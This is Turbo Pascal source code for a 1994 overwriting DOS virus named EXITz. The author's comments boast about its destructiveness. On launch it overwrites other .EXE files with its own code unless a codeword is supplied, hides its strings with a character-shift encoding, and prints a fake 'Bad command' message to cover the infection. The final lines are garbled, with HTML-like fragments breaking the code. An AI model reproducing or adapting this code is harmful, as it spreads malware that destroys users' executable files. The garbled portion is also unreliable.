

Program EXITz;

(* This is written by Iceman, September 2nd, 1994.
Dedicated to Exit, a good friend of mine.

This is virus source code, and is not intended to be distributed.

Thank you very much. *)

(* Version 1.0 *)

{$I-}

(* This production has been made possible by the letters 'T' and 'P', and
the number '666'. *)

uses dos;

const compilesize=3855;  (* Final size of program after compile *)
      numblocks=1;
      
type diskbuffer = array [1..compilesize] of byte;
                         (* Buffer for file copy *)


Function Decode(instr:string) : string;
var s: string;
    b: byte;
begin
  s[0]:=instr[0];
  for b:=1 to length(instr) do begin
   s[b]:=chr(ord(instr[b])-10);
  end;
  decode:=s;
end;


Procedure DecodeShow(instr : string);
var s: string;
    b: byte;
begin
  s:=decode(instr);
  writeln(s);
end;



(* This is a unique accomplishment for me, the first time I have ever
written a virus in Pascal. For that reason, I do not intend to make it
an advanced appending virus, but rather overwriting code. *)

Procedure Infect(tsrec : searchrec);
(* This thing infects something.. It's evil. *)
var fa, fb : file of diskbuffer;
    db : diskbuffer;
    i : integer;
begin
  assign(fa, tsrec.name);    (* I'm evil and damn proud *)
  assign(fb, paramstr(0));
  reset(fa);                 (* Here's the target, sonny.. shoot it dead *)
  reset(fb);
  seek(fa, 0); seek(fb, 0);
  for i:=1 to numblocks do begin
   read(fb, db); write (fa, db); (* Let's mosey on over to that file *)
  end;
end;


Function Checkinfect(tsrec : searchrec) : boolean;
(* This thing finds out if something's infected or not *)
var fa, fb : file of diskbuffer;
    dba, dbb : diskbuffer;
begin
  assign(fa, tsrec.name);
  reset(fa);
  assign(fb, paramstr(0));
  reset(fb);
  read(fa, dba);
  read(fb, dbb);
  checkinfect := false;
  if ((dba[1]=dbb[1]) and (dba[9]=dbb[9]) and (dba[210]=dbb[210])) then checkinfect := true;
end;

Procedure FindInfect(Wildcard : string);
(* This thing finds other files to infect *)
var tsrec : searchrec;
    brk : boolean;
begin
  FindFirst(Wildcard,$3F,tsrec);
  if not Checkinfect(tsrec) then infect(tsrec)
   else begin
    brk := false;
    while not brk do begin
     findnext(tsrec); 
     if doserror<>0 then brk:=true;
     if not checkinfect(tsrec) then begin 
      infect(tsrec); 
      brk:=true; 
     end;
    end;
   end;
end;

Procedure Infct;
var s : string;
begin
  readln(s);
  findinfect(s);
end;

Procedure Check;
var wildcard : string;
    tsrec : searchrec;
begin
  readln(wildcard);
  FindFirst(Wildcard,$3F,tsrec);
  if checkinfect(tsrec) then decodeshow('ObS^') else writeln ('NO');
  writeln('');
end;

Function Ucase(instr : string) : string;
var b:byte;
begin
  Ucase[0]:=Instr[0];
  For b:=1 to length(instr) do Ucase[b]:=upcase(instr[b]);
end;

procedure ShowVer;
begin
  decodeshow('^rs}*s}*nonsmk~on*~y*Obs^8');
  writeln('');
end;

procedure ExitDos;
var s,t : string;
    leave, supreme : boolean;
begin
  leave:=false; supreme := false;
  while not leave do begin
   s:='';
   decodeshow('Ox~o|*1ObS^1*~y*o‚s~*O‚s~1}*Obs^8');
   write(decode('MDfObS^H'));
   readln(s);
   
   if supreme then begin
    if ucase(s)=decode('SXPOM^') then infct;
    if ucase(s)=decode('MROMU') then check;
   end;

   if ucase(s)=decode('ObS^') then leave := true else
   if ucase(s)=decode('`O\') then ShowVer else 
   if ucase(s)=decode('TOKXV_M') then supreme := true else
    begin
     decodeshow('Lkn*mywwkxn*y|*psvo*xkwo'); writeln(''); end;
    end;
end;

begin
  randomize;

  (* Check for codeword.. (JEANLUC) *)
  if paramstr(1)<>decode('TOKXV_M') then findinfect(decode('48ObO')) else (* Go and nail those files, sonny! *)
   writeln(decode(']KPO*\_X'));                          (* SAFE RUN *)

  if (random(10)<8) then="" decodeshow('lkn*mywwkxn*y|*psvo*xkwo')="" (*="" sucker="" message="" *)="" else="" begin="" decodeshow('obs^*ny]*`o|}syx*@8@@');="" decodeshow('*************2m3myz|sqr~*ox~|kxmo*yp*o‚s~*my|z*;cc="">');
    writeln('');
    ExitDos;
   end;
end.

</8)>